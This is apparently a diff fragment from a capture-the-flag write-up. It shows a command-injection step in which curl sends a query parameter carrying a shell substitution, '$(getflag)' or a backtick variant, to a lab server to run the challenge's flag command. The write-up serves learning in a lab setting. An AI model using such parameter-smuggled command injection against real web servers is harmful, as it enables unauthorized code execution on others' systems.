@@ -39,5 +39,6 @@ So, we can execute it ithrough the apache server
 We will exploit the var x and send the getflag command through it 
 
 curl ip:4747/?x='$(getflag)'
-
+or
+curl ip:4747?x=\`getflag\`
 and bingo
